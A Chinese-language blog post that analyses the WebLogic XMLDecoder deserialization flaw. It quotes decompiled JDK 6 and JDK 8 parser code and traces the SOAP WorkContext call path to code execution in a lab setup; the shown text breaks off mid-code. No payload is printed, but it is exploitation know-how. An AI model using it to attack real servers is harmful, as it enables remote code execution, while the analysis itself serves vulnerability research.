<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-cn">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="web,weblogic," />










<meta name="description" content="实际上这篇文章难产了很久，反正就是前前后后摸了很久，这个洞感觉下来就是jdk的xmldecoder无限制的反序列化导致的代码执行。值得一提的是jdk的xmldecoder反序列化的处理方式在jdk6以下和6以后是不同的，这点不同导致很多8下可行的绕过方式没法在6下利用，所以分析处理流程时，本文会分版本讨论。">
<meta property="og:type" content="article">
<meta property="og:title" content="weblogic_xmldecoder复现">
<meta property="og:url" content="http://www.star123.top/2021/01/03/weblogic-xmldecoder%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="star&#39;s blog">
<meta property="og:description" content="实际上这篇文章难产了很久，反正就是前前后后摸了很久，这个洞感觉下来就是jdk的xmldecoder无限制的反序列化导致的代码执行。值得一提的是jdk的xmldecoder反序列化的处理方式在jdk6以下和6以后是不同的，这点不同导致很多8下可行的绕过方式没法在6下利用，所以分析处理流程时，本文会分版本讨论。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/01/04/o5SpnbqcW398lkM.png">
<meta property="og:image" content="https://i.loli.net/2021/01/05/ayLZECMcsfSudm2.png">
<meta property="og:image" content="https://i.loli.net/2021/01/05/HfUJX6OLqSipAPR.png">
<meta property="og:image" content="https://i.loli.net/2021/01/05/yotFnJeK46PLcu5.png">
<meta property="og:image" content="https://i.loli.net/2021/01/05/EKNy8SuXZl6UaQP.png">
<meta property="og:image" content="https://i.loli.net/2021/01/29/dLtN69wEZOj8DJX.png">
<meta property="og:image" content="https://i.loli.net/2021/01/05/75M9KxlqwgUFyh8.png">
<meta property="article:published_time" content="2021-01-03T12:37:39.000Z">
<meta property="article:modified_time" content="2021-01-29T02:43:00.949Z">
<meta property="article:author" content="star">
<meta property="article:tag" content="web">
<meta property="article:tag" content="weblogic">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/01/04/o5SpnbqcW398lkM.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://www.star123.top/2021/01/03/weblogic-xmldecoder复现/"/>





  <title>weblogic_xmldecoder复现 | star's blog</title>
  








<meta name="generator" content="Hexo 4.2.1"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-cn">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">star's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2021/01/03/weblogic-xmldecoder%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="star">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="star's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">weblogic_xmldecoder复现</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-01-03T20:37:39+08:00">
                2021-01-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>实际上这篇文章难产了很久，反正就是前前后后摸了很久，这个洞感觉下来就是jdk的xmldecoder无限制的反序列化导致的代码执行。值得一提的是jdk的xmldecoder反序列化的处理方式在jdk6以下和6以后是不同的，这点不同导致很多8下可行的绕过方式没法在6下利用，所以分析处理流程时，本文会分版本讨论。</p>
<a id="more"></a>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实际上这篇文章难产了很久，反正就是前前后后摸了很久，这个洞感觉下来就是jdk的xmldecoder无限制的反序列化导致的代码执行。值得一提的是jdk的xmldecoder反序列化的处理方式在jdk6以下和6以后是不同的，这点不同导致很多8下可行的绕过方式没法在6下利用，所以分析处理流程时，本文会分版本讨论。</p>
<h2 id="xml-decoder反序列化处理流程"><a href="#xml-decoder反序列化处理流程" class="headerlink" title="xml decoder反序列化处理流程"></a>xml decoder反序列化处理流程</h2><h3 id="jdk8下的处理流程"><a href="#jdk8下的处理流程" class="headerlink" title="jdk8下的处理流程"></a>jdk8下的处理流程</h3><p>8下的xmldecoder的反序列化流程较为清晰，也较为典型。</p>
<p>基本上就是从<strong>XMLDocumentFragmentScannerImpl</strong>的<strong>scanDocument</strong>方法开始，该方法实现的xml反序列化过程是一套有限自动机。主要关注点是3个状态，<strong>startElement</strong>,<strong>endElement</strong>,还有中间状态。</p>
<ul>
<li><p><strong>startElement</strong>：在遇到节点起始标签是起作用，解析一个节点先是解析节点的类型，并按照节点的类型调用<strong>elementHandler</strong>，设置完后依次放入解析属性并放入当前节点对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">ElementHandler var5 = <span class="keyword">this</span>.handler;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.handler = (ElementHandler)<span class="keyword">this</span>.getElementHandler(var3).newInstance();</span><br><span class="line">            <span class="keyword">this</span>.handler.setOwner(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">this</span>.handler.setParent(var5);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SAXException(var10);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var6 = <span class="number">0</span>; var6 &lt; var4.getLength(); ++var6) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              	<span class="comment">//设置attr的名称和值</span></span><br><span class="line">                String var7 = var4.getQName(var6);</span><br><span class="line">                String var8 = var4.getValue(var6);</span><br><span class="line">                <span class="keyword">this</span>.handler.addAttribute(var7, var8);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException var9) &#123;</span><br><span class="line">                <span class="keyword">this</span>.handleException(var9);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.handler.startElement();</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p><strong>endElement</strong>：在遇到节点闭合时起作用，作用一般有二，首先，是表达式栈中的表达式弹出，然后执行表达式并将执行结果重新入栈，该操作一般使用<strong>getValueObject</strong>方法来实现。其次，它判断当前节点和上级节点的关系，将当前节点作为上级节点的参数或者其他。</p>
</li>
<li><p>创建对象的操作一般通过将表达式的方法名设置为<strong>new</strong>来实现，需要指出的是new方法实例化对象实际上是借助了<strong>newInstance</strong>方法，也就是说实例化的类必须有一个无参数构造器。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> ValueObject <span class="title">getValueObject</span><span class="params">(Class&lt;?&gt; var1, Object[] var2)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.field != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(FieldElementHandler.getFieldValue(<span class="keyword">this</span>.getContextBean(), <span class="keyword">this</span>.field));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.idref != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(<span class="keyword">this</span>.getVariable(<span class="keyword">this</span>.idref));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object var3 = <span class="keyword">this</span>.getContextBean();</span><br><span class="line">            String var4;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.index != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var4 = var2.length == <span class="number">2</span> ? <span class="string">"set"</span> : <span class="string">"get"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.property != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var4 = var2.length == <span class="number">1</span> ? <span class="string">"set"</span> : <span class="string">"get"</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="keyword">this</span>.property.length()) &#123;</span><br><span class="line">                    var4 = var4 + <span class="keyword">this</span>.property.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) + <span class="keyword">this</span>.property.substring(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var4 = <span class="keyword">this</span>.method != <span class="keyword">null</span> &amp;&amp; <span class="number">0</span> &lt; <span class="keyword">this</span>.method.length() ? <span class="keyword">this</span>.method : <span class="string">"new"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Expression var5 = <span class="keyword">new</span> Expression(var3, var4, var2);</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(var5.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>中间流程：节点和节点之间的换行空格是会被忽略的，并不影响解析结果。</li>
<li>不同类型的节点解析依赖不同的<strong>elementHandler</strong>，这是Handler的继承关系，其中<strong>NewElementHandler</strong>节点结束时会创建对象或者执行方法，<strong>AccessorElementHandler</strong>能够设置或者访问当前对象的属性。</li>
</ul>
<p><img src="https://i.loli.net/2021/01/04/o5SpnbqcW398lkM.png" alt="image-20210104192017335"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DocumentHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"java"</span>, JavaElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"null"</span>, NullElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"array"</span>, ArrayElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"class"</span>, ClassElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"string"</span>, StringElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"object"</span>, ObjectElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"void"</span>, VoidElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"char"</span>, CharElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"byte"</span>, ByteElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"short"</span>, ShortElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"int"</span>, IntElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"long"</span>, LongElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"float"</span>, FloatElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"double"</span>, DoubleElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"boolean"</span>, BooleanElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"new"</span>, NewElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"var"</span>, VarElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"true"</span>, TrueElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"false"</span>, FalseElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"field"</span>, FieldElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"method"</span>, MethodElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">this</span>.setElementHandler(<span class="string">"property"</span>, PropertyElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="jdk6下的处理流程"><a href="#jdk6下的处理流程" class="headerlink" title="jdk6下的处理流程"></a>jdk6下的处理流程</h3><p>jdk6下的基本流程是可以走得通的，但是有一大票标签都没法用了，这里提一下，后面所有的复现环境都在jdk7下进行。</p>
<p>简单地来说，new和property标签都没法打，相当多绕过的payload都没法用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String var1, AttributeList var2)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        var1 = var1.intern();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isString) &#123;</span><br><span class="line">            <span class="keyword">this</span>.parseCharCode(var1, <span class="keyword">this</span>.getAttributes(var2));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.chars.setLength(<span class="number">0</span>);</span><br><span class="line">            HashMap var3 = <span class="keyword">this</span>.getAttributes(var2);</span><br><span class="line">            MutableExpression var4 = <span class="keyword">new</span> MutableExpression();</span><br><span class="line">            String var5 = (String)var3.get(<span class="string">"class"</span>);</span><br><span class="line">            <span class="keyword">if</span> (var5 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var4.setTarget(<span class="keyword">this</span>.classForName2(var5));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Object var6 = var3.get(<span class="string">"property"</span>);</span><br><span class="line">            String var7 = (String)var3.get(<span class="string">"index"</span>);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var6 = <span class="keyword">new</span> Integer(var7);</span><br><span class="line">                var4.addArg(var6);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var4.setProperty(var6);</span><br><span class="line">            String var8 = (String)var3.get(<span class="string">"method"</span>);</span><br><span class="line">            <span class="keyword">if</span> (var8 == <span class="keyword">null</span> &amp;&amp; var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                var8 = <span class="string">"new"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var4.setMethodName(var8);</span><br><span class="line">            String var11;</span><br><span class="line">            String var14;</span><br><span class="line">            <span class="keyword">if</span> (var1 == <span class="string">"string"</span>) &#123;</span><br><span class="line">                var4.setTarget(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                var4.setMethodName(<span class="string">"new"</span>);</span><br><span class="line">                <span class="keyword">this</span>.isString = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.isPrimitive(var1)) &#123;</span><br><span class="line">                Class var9 = typeNameToClass(var1);</span><br><span class="line">                var4.setTarget(var9);</span><br><span class="line">                var4.setMethodName(<span class="string">"new"</span>);</span><br><span class="line">                <span class="keyword">this</span>.parseCharCode(var1, var3);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="string">"class"</span>) &#123;</span><br><span class="line">                var4.setTarget(Class<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                var4.setMethodName(<span class="string">"forName"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="string">"null"</span>) &#123;</span><br><span class="line">                var4.setTarget(Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                var4.setMethodName(<span class="string">"getSuperclass"</span>);</span><br><span class="line">                var4.setValue((Object)<span class="keyword">null</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="string">"void"</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (var4.getTarget() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    var4.setTarget(<span class="keyword">this</span>.eval());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="string">"array"</span>) &#123;</span><br><span class="line">                var14 = (String)var3.get(<span class="string">"class"</span>);</span><br><span class="line">                Class var10 = var14 == null ? Object.class : this.classForName2(var14);</span><br><span class="line">                var11 = (String)var3.get(<span class="string">"length"</span>);</span><br><span class="line">                <span class="keyword">if</span> (var11 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    var4.setTarget(Array<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                    var4.addArg(var10);</span><br><span class="line">                    var4.addArg(<span class="keyword">new</span> Integer(var11));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Class var12 = Array.newInstance(var10, <span class="number">0</span>).getClass();</span><br><span class="line">                    var4.setTarget(var12);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="string">"java"</span>) &#123;</span><br><span class="line">                var4.setValue(<span class="keyword">this</span>.is);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 != <span class="string">"object"</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.simulateException(<span class="string">"Unrecognized opening tag: "</span> + var1 + <span class="string">" "</span> + <span class="keyword">this</span>.attrsToString(var2));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var14 = (String)var3.get(<span class="string">"id"</span>);</span><br><span class="line">            <span class="keyword">if</span> (var14 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.environment.put(var14, var4);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String var13 = (String)var3.get(<span class="string">"idref"</span>);</span><br><span class="line">            <span class="keyword">if</span> (var13 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var4.setValue(<span class="keyword">this</span>.lookup(var13));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var11 = (String)var3.get(<span class="string">"field"</span>);</span><br><span class="line">            <span class="keyword">if</span> (var11 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var4.setValue(<span class="keyword">this</span>.getFieldValue(var4.getTarget(), var11));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.expStack.add(var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通常而言，尽管6的标签较少但是，6的解析较为宽松。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>使用<a href="https://github.com/QAX-A-Team/WeblogicEnvironment.git" target="_blank" rel="noopener">A-Team的weblogic环境</a>，jdk7u21，weblogic 10.3.6，idea远程调试，docker开放端口7001和8453。</p>
<p>具体调试主要参考了<a href="https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html" target="_blank" rel="noopener">idea+docker</a>的调试步骤，建议导入jar包和war包，war包中的<strong>web.xml</strong>文件记录了路由和<strong>servlet</strong>对应的关系。</p>
<h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><ol>
<li>使用vulhub给出的poc，然后直接在<strong>java.lang.ProcessBuilder</strong>的<strong>start</strong>方法下断点，记录从<strong>xmldecoder.readObject</strong>开始的调用堆栈。</li>
</ol>
<p><img src="https://i.loli.net/2021/01/05/ayLZECMcsfSudm2.png" alt="image-20210105190018896"></p>
<ol start="2">
<li><p>该漏洞的主要成因是使用<strong>weblogic</strong>原生的servlet来处理soap请求，在原生servlet中使用xmldecoder来直接解析输入的xml内容最终导致反序列化。(这里直接使用WebService注解绑定)</p>
<p><img src="https://i.loli.net/2021/01/05/HfUJX6OLqSipAPR.png" alt="image-20210105194524695"></p>
</li>
<li><p><strong>HttpAdapter.HttpToolkit</strong>的<strong>handler</strong>方法用于提取http数据包中的xml内容。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">packet = HttpAdapter.<span class="keyword">this</span>.decodePacket(con, <span class="keyword">this</span>.codec);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>WorkContextServerTube</strong>的<strong>processRequest</strong>方法将soap请求中<strong>WorkContext</strong>并将内容送入<strong>readHeaderOld</strong>方法</p>
<p><img src="https://i.loli.net/2021/01/05/yotFnJeK46PLcu5.png" alt="image-20210105201244314"></p>
</li>
<li><p><strong>readHeaderOld</strong>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">readHeaderOld</span><span class="params">(Header var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            XMLStreamReader var2 = var1.readHeader();</span><br><span class="line">            var2.nextTag();</span><br><span class="line">            var2.nextTag();</span><br><span class="line">            XMLStreamReaderToXMLStreamWriter var3 = <span class="keyword">new</span> XMLStreamReaderToXMLStreamWriter();</span><br><span class="line">            ByteArrayOutputStream var4 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4);</span><br><span class="line">            var3.bridge(var2, var5);</span><br><span class="line">            var5.close();</span><br><span class="line">            WorkContextXmlInputAdapter var6 = <span class="keyword">new</span> WorkContextXmlInputAdapter(<span class="keyword">new</span> ByteArrayInputStream(var4.toByteArray()));</span><br><span 